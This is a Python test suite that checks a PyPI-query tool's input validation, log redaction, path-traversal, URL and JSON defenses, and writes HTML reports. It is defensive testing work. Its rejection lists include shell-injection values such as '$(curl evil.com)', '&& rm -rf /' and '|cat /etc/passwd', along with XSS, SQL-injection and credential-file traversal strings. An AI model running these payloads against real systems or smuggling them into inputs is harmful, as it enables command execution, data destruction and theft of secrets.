#!/usr/bin/env python3
"""Enhanced security testing suite with beautiful HTML reporting."""

import asyncio
import logging
import time
from pathlib import Path
from typing import Any, Dict, List

# Import the original security test suite
from test_security_comprehensive import SecurityTestSuite

# Import our new HTML reporting framework
from pypi_query_mcp.reports import SecurityTestReporter, ReportConfig
from pypi_query_mcp.reports.test_integration import (
    SecurityTestRunner,
    run_security_tests_with_reporting,
    create_demo_report_config
)

# Configure logging for tests
logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
logger = logging.getLogger(__name__)


class EnhancedSecurityTestSuite(SecurityTestSuite):
    """Enhanced security test suite with HTML reporting integration."""

    def __init__(self):
        super().__init__()
        self.assertion_count = 0

    def assert_true(self, condition: bool, message: str = ""):
        """Enhanced assertion with counting."""
        self.assertion_count += 1
        if not condition:
            raise AssertionError(message or f"Assertion {self.assertion_count} failed")

    def assert_raises(self, exception_type, callable_obj, *args, **kwargs):
        """Enhanced assertion for exception testing."""
        self.assertion_count += 1
        try:
            if asyncio.iscoroutinefunction(callable_obj):
                # This is a bit tricky for async functions, but we'll handle it
                result = callable_obj(*args, **kwargs)
                if asyncio.iscoroutine(result):
                    # We need to await it, but we're not in an async context
                    # This is a simplified version - in real use, you'd handle this better
                    raise AssertionError(f"Expected {exception_type.__name__} but no exception was raised")
            else:
                callable_obj(*args, **kwargs)
            raise AssertionError(f"Expected {exception_type.__name__} but no exception was raised")
        except exception_type:
            # This is what we expected
            pass
        except Exception as e:
            raise AssertionError(f"Expected {exception_type.__name__} but got {type(e).__name__}: {e}")

    async def test_input_validation_attacks(self):
        """Test input validation against various attack vectors."""
        logger.info("Testing input validation against attack vectors...")

        # Import the validation functions we need
        from pypi_query_mcp.security.validation import SecurityValidationError
        from pypi_query_mcp.security.input_validator import validate_package_name, validate_search_query

        # Test malicious package names
        malicious_packages = [
            "../../../etc/passwd",
            "<script>alert('xss')</script>",
            "'; DROP TABLE packages; --",
            "package`echo malicious`",
            "$(curl evil.com)",
            "&& rm -rf /",
            "|cat /etc/passwd",
            "package\x00.exe",
            "a" * 300,  # Too long
            "",  # Empty
            "   ",  # Whitespace only
        ]

        for malicious_package in malicious_packages:
            try:
                validate_package_name(malicious_package)
                self.assert_true(False, f"Malicious package name '{malicious_package}' was not rejected!")
            except SecurityValidationError:
                # This is expected - the validation should reject it
                logger.debug(f"✓ Correctly rejected: {malicious_package}")

        # Test malicious search queries
        malicious_queries = [
            "<iframe src=javascript:alert('xss')>",
            "javascript:void(0)",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:msgbox('xss')",
            "onload=alert('xss')",
            "onerror=alert('xss')",
        ]

        for malicious_query in malicious_queries:
            try:
                validate_search_query(malicious_query)
                self.assert_true(False, f"Malicious search query '{malicious_query}' was not rejected!")
            except SecurityValidationError:
                logger.debug(f"✓ Correctly rejected: {malicious_query}")

        logger.info("✅ Input validation successfully blocked all attack vectors")

    async def test_log_sanitization_comprehensive(self):
        """Test comprehensive log sanitization patterns."""
        logger.info("Testing comprehensive log sanitization...")

        from pypi_query_mcp.security.validation import sanitize_for_logging

        # Test cases with expected sanitization
        test_cases = [
            # API tokens and keys
            ("token=pypi-AgEIcHlwaS5vcmcCJGY4NGIw", "token=***REDACTED***"),
            ("Authorization: Bearer ghp_1234567890abcdef", "Authorization: Bearer ***REDACTED***"),
            ("password=\"mysecret123\"", "password=***REDACTED***"),
            ("secret_key=sk-1234567890abcdef", "secret_key=***REDACTED***"),

            # GitHub tokens
            ("ghp_1234567890abcdef1234567890abcdef12345678", "***REDACTED_GITHUB_TOKEN***"),
            ("github_pat_11ABCDEFG0123456789012345678901234567890123456789012345678901234567890", "***REDACTED_GITHUB_PAT***"),

            # AWS credentials
            ("AKIAIOSFODNN7EXAMPLE", "***REDACTED_AWS_KEY***"),
            ("wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "***REDACTED_AWS_SECRET***"),

            # Email addresses
            ("user@example.com", "***REDACTED_EMAIL***"),
            ("Contact support at admin@company.org", "Contact support at ***REDACTED_EMAIL***"),

            # URLs with credentials
            ("https://user:pass@github.com/repo.git", "***REDACTED_URL_WITH_CREDS***"),
            ("ftp://admin:secret@ftp.example.com/file", "***REDACTED_URL_WITH_CREDS***"),

            # File paths
            ("/home/john/secrets/file.txt", "/home/***USER***/secrets/file.txt"),
            ("/Users/alice/Documents/private", "/Users/***USER***/Documents/private"),

            # Private keys
            ("-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----", "***REDACTED_PRIVATE_KEY***"),

            # Environment variables
            ("SECRET_KEY=mysecretvalue", "SECRET_KEY=***REDACTED***"),

            # Normal text should remain unchanged
            ("This is a normal log message", "This is a normal log message"),
        ]

        for original, expected_pattern in test_cases:
            sanitized = sanitize_for_logging(original)
            self.assert_true(
                expected_pattern in sanitized or sanitized == expected_pattern,
                f"Sanitization failed for '{original}': got '{sanitized}', expected pattern '{expected_pattern}'"
            )
            logger.debug(f"✓ Sanitized: {original[:30]}... → {sanitized[:30]}...")

        logger.info("✅ Log sanitization working correctly for all patterns")

    async def test_path_traversal_protection(self):
        """Test path traversal attack protection."""
        logger.info("Testing path traversal protection...")

        from pypi_query_mcp.security.validation import secure_validate_file_path, SecurityValidationError

        # Test malicious file paths
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "./../../etc/shadow",
            "~/../../../etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "file:///etc/passwd",
            "/proc/self/environ",
            "/dev/urandom",
        ]

        for malicious_path in malicious_paths:
            try:
                result = secure_validate_file_path(malicious_path)
                self.assert_true(
                    not result.get("secure", True),
                    f"Malicious path '{malicious_path}' was not detected as insecure!"
                )
            except SecurityValidationError:
                # This is expected for dangerous paths
                logger.debug(f"✓ Correctly rejected: {malicious_path}")

        # Test safe paths
        safe_paths = [
            "./safe_file.txt",
            "data/packages.json",
            "reports/analysis.pdf",
            "temp/download.zip",
        ]

        for safe_path in safe_paths:
            try:
                result = secure_validate_file_path(safe_path)
                self.assert_true(
                    result.get("valid", False),
                    f"Safe path '{safe_path}' was incorrectly rejected!"
                )
                logger.debug(f"✓ Correctly accepted: {safe_path}")
            except SecurityValidationError as e:
                self.assert_true(False, f"Safe path '{safe_path}' was incorrectly rejected: {e}")

        logger.info("✅ Path traversal protection working correctly")

    async def test_rate_limiting_functionality(self):
        """Test rate limiting functionality and performance."""
        logger.info("Testing rate limiting functionality...")

        from pypi_query_mcp.core.rate_limiter import TokenBucket

        # Test token bucket functionality
        bucket = TokenBucket(capacity=5, refill_rate=2.0)  # 5 tokens, refill 2/second

        # Should be able to consume initial tokens quickly
        start_time = time.time()
        for i in range(5):
            consumed = await bucket.consume()
            self.assert_true(consumed, f"Failed to consume token {i+1} from fresh bucket")

        elapsed = time.time() - start_time
        self.assert_true(elapsed < 0.1, f"Token consumption took too long: {elapsed}s")

        # Should fail to consume 6th token immediately
        consumed = await bucket.consume()
        self.assert_true(not consumed, "Token bucket allowed consumption beyond capacity")

        # Wait for refill and try again
        logger.info("Testing token bucket refill mechanism...")
        await asyncio.sleep(1.0)  # Wait for refill
        consumed = await bucket.consume()
        self.assert_true(consumed, "Token bucket did not refill as expected")

        logger.info("✅ Token bucket rate limiting working correctly")

    async def test_malicious_package_names(self):
        """Test package name validation against advanced attacks."""
        logger.info("Testing advanced malicious package name detection...")

        from pypi_query_mcp.security.validation import secure_validate_package_name, SecurityValidationError

        # Unicode and encoding attacks
        malicious_unicode = [
            "package\u0000hidden",  # Null byte
            "package\u200b\u200c\u200d",  # Zero-width characters
            "package\u202e\u202d",  # Bidirectional text override
            "package\uFEFF",  # Byte order mark
            "package\u2028\u2029",  # Line/paragraph separators
        ]

        for malicious_name in malicious_unicode:
            try:
                result = secure_validate_package_name(malicious_name)
                self.assert_true(
                    not result.get("secure", True),
                    f"Malicious Unicode package name was not detected: {repr(malicious_name)}"
                )
            except SecurityValidationError:
                logger.debug(f"✓ Correctly rejected Unicode attack: {repr(malicious_name)}")

        # Test legitimate package names
        legitimate_names = [
            "requests",
            "django-rest-framework",
            "numpy",
            "python-dateutil",
            "package_with_underscores",
            "package.with.dots",
            "a",  # Single character
            "package123",
        ]

        for name in legitimate_names:
            try:
                result = secure_validate_package_name(name)
                self.assert_true(
                    result.get("valid", False),
                    f"Legitimate package name was rejected: {name}"
                )
                logger.debug(f"✓ Correctly accepted: {name}")
            except SecurityValidationError as e:
                self.assert_true(False, f"Legitimate package name was rejected: {name} - {e}")

        logger.info("✅ Advanced package name validation working correctly")

    async def test_url_security_validation(self):
        """Test URL security validation."""
        logger.info("Testing URL security validation...")

        from pypi_query_mcp.security.validation import secure_validate_url, SecurityValidationError

        # Malicious URLs
        malicious_urls = [
            "javascript:alert('xss')",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:msgbox('xss')",
            "file:///etc/passwd",
            "ftp://admin:secret@internal.server/",
            "ldap://evil.com/",
            "gopher://evil.com/",
        ]

        for malicious_url in malicious_urls:
            try:
                result = secure_validate_url(malicious_url)
                self.assert_true(
                    not result.get("secure", True),
                    f"Malicious URL was not detected: {malicious_url}"
                )
            except SecurityValidationError:
                logger.debug(f"✓ Correctly rejected: {malicious_url}")

        # Safe URLs
        safe_urls = [
            "https://pypi.org/simple/",
            "https://github.com/user/repo",
            "https://api.github.com/repos/user/repo",
            "http://localhost:8080/api",
        ]

        for safe_url in safe_urls:
            try:
                result = secure_validate_url(safe_url)
                self.assert_true(
                    result.get("valid", False),
                    f"Safe URL was rejected: {safe_url}"
                )
                logger.debug(f"✓ Correctly accepted: {safe_url}")
            except SecurityValidationError as e:
                self.assert_true(False, f"Safe URL was rejected: {safe_url} - {e}")

        logger.info("✅ URL security validation working correctly")

    async def test_json_injection_protection(self):
        """Test JSON injection and depth limit protection."""
        logger.info("Testing JSON injection protection...")

        from pypi_query_mcp.security.validation import InputSanitizer, SecurityValidationError

        # Test depth limit
        try:
            # Create deeply nested JSON
            deep_json = {"level": 1}
            current = deep_json
            for i in range(2, 15):  # Create 15 levels deep
                current["nested"] = {"level": i}
                current = current["nested"]

            InputSanitizer.validate_json_input(deep_json, max_depth=10)
            self.assert_true(False, "Deep JSON was not rejected")
        except SecurityValidationError:
            logger.debug("✓ Correctly rejected deeply nested JSON")

        # Test size limit
        try:
            large_json = {f"key_{i}": f"value_{i}" for i in range(2000)}
            InputSanitizer.validate_json_input(large_json, max_items=1000)
            self.assert_true(False, "Large JSON was not rejected")
        except SecurityValidationError:
            logger.debug("✓ Correctly rejected oversized JSON")

        # Test safe JSON
        safe_json = {
            "package": "requests",
            "version": "2.31.0",
            "dependencies": ["urllib3", "certifi"],
            "metadata": {
                "author": "Kenneth Reitz",
                "license": "Apache 2.0"
            }
        }

        try:
            InputSanitizer.validate_json_input(safe_json)
            logger.debug("✓ Correctly accepted safe JSON")
        except SecurityValidationError as e:
            self.assert_true(False, f"Safe JSON was rejected: {e}")

        logger.info("✅ JSON injection protection working correctly")

    async def test_performance_under_load(self):
        """Test performance of security features under load."""
        logger.info("Testing performance under load...")

        from pypi_query_mcp.security.validation import sanitize_for_logging
        from pypi_query_mcp.security.input_validator import validate_package_name

        # Test log sanitization performance
        test_string = "token=pypi-secret password=hidden email@example.com /home/user/file.txt"
        iterations = 1000

        start_time = time.time()
        for _ in range(iterations):
            sanitize_for_logging(test_string)
        sanitization_time = time.time() - start_time

        self.assert_true(sanitization_time < 1.0, f"Log sanitization is too slow: {sanitization_time}s for {iterations} operations")
        logger.info(f"✓ Log sanitization performance good: {sanitization_time:.3f}s for {iterations} ops")

        # Test input validation performance
        start_time = time.time()
        for _ in range(iterations):
            try:
                validate_package_name("test-package")
            except:
                pass
        validation_time = time.time() - start_time

        self.assert_true(validation_time < 2.0, f"Input validation is too slow: {validation_time}s for {iterations} operations")
        logger.info(f"✓ Input validation performance good: {validation_time:.3f}s for {iterations} ops")

        logger.info("✅ Performance testing completed")

    async def test_edge_cases_and_corner_cases(self):
        """Test edge cases and corner cases."""
        logger.info("Testing edge cases and corner cases...")

        from pypi_query_mcp.security.validation import sanitize_for_logging, SecurityValidationError
        from pypi_query_mcp.security.input_validator import validate_package_name

        # Test empty and None inputs
        edge_cases = [
            (None, "None input"),
            ("", "Empty string"),
            ("   ", "Whitespace only"),
            ("a" * 1000, "Very long input"),
            ("\x00\x01\x02", "Binary data"),
            ("🔒🚀💻", "Unicode emoji"),
        ]

        for test_input, description in edge_cases:
            try:
                # Test sanitization (should handle all inputs gracefully)
                sanitized = sanitize_for_logging(test_input)
                logger.debug(f"✓ Sanitization handled {description}: {len(str(sanitized))} chars")

                # Test package validation (should reject most edge cases)
                if test_input and isinstance(test_input, str) and test_input.strip():
                    try:
                        validate_package_name(test_input)
                        if len(test_input) > 214:  # PyPI limit
                            self.assert_true(False, f"Oversized input was accepted: {description}")
                    except SecurityValidationError:
                        logger.debug(f"✓ Validation correctly rejected {description}")

            except Exception as e:
                logger.warning(f"Unexpected error with {description}: {e}")

        logger.info("✅ Edge case testing completed")


async def run_tests_with_beautiful_reports():
    """Run security tests with beautiful HTML reporting."""

    # Create different report configurations for demonstration
    configs = {
        "gruvbox-dark": create_demo_report_config("gruvbox-dark"),
        "solarized-dark": create_demo_report_config("solarized-dark"),
        "dracula": create_demo_report_config("dracula"),
    }

    report_paths = []

    for theme_name, config in configs.items():
        logger.info(f"\n🎨 Generating report with {theme_name} theme...")

        # Customize output filename
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        output_file = f"security_report_{theme_name}_{timestamp}.html"

        # Run tests with this configuration
        report_path = await run_security_tests_with_reporting(
            EnhancedSecurityTestSuite,
            report_config=config,
            output_file=output_file
        )

        report_paths.append(report_path)
        logger.info(f"📊 {theme_name.title()} report generated: {report_path}")

    return report_paths


async def main():
    """Main function to run tests with HTML reporting."""
    logger.info("🚀 Starting Enhanced Security Test Suite with HTML Reporting")
    logger.info("=" * 80)

    try:
        # Run tests with beautiful reports
        report_paths = await run_tests_with_beautiful_reports()

        logger.info("\n" + "=" * 80)
        logger.info("🎉 ALL REPORTS GENERATED SUCCESSFULLY!")
        logger.info("=" * 80)

        for path in report_paths:
            logger.info(f"📄 Report: {path}")
            logger.info(f"🌐 Open in browser: file://{path.resolve()}")

        logger.info("\n💡 Tip: Open the HTML files in your browser to view the beautiful reports!")
        logger.info("💡 Each report includes interactive features, performance charts, and detailed logs.")

    except Exception as e:
        logger.error(f"❌ Test execution failed: {e}")
        raise


if __name__ == "__main__":
    asyncio.run(main())